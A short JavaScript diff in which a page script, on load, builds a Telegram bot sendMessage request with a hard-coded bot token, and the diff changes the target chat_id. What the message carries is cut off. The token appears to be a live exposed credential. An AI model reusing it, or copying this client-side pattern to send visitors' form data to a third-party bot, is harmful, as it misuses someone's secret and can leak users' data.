@@ -10,7 +10,7 @@ document.addEventListener("DOMContentLoaded", () => {
 
         // Telegram API uchun kerakli ma’lumotlar
         const token = "7774524384:AAH2FGSURtK7zWe6gZjG6JMayp1xdOfuxRc";
-        const chat_id = "-7774524384";
+        const chat_id = "-1002634481700";
         const telegramUrl = `https://api.telegram.org/bot${token}/sendMessage`;
 
         const text = `
